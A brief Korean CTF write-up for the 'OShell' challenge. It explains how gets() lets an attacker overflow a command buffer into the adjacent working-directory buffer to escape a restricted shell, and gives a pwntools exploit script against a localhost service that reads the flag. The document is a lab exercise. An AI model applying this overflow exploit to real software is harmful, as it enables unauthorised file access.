# OShell

# Usage

# Concept

- BOF

# Writeup

## 취약점
상위 경로로 이동이 불가능한 쉘이 주어지고, /flag.txt 를 읽는 문제이다. \
커맨드 버퍼와 cwd 경로를 저장하는 버퍼가 붙어있고, gets 함수를 이용하여 입력을 받기 때문에 cwd 버퍼를 덮어써서 최상위 경로인 / 로 이동한 후 cat flag.txt로 플래그를 읽을 수 있다. 

 ## Exploit 
 ```py
from pwn import *
p = remote('localhost', 15252)

def exploit():
    cmd = "cat flag.txt"
    padding_size = 128 - len(cmd)
    new_cwd = "/"
    payload = cmd + "A" * padding_size + new_cwd
    return payload

if __name__ == "__main__":
    p.sendline(exploit())
    p.sendline(b"cat flag.txt")
    p.interactive()
 ```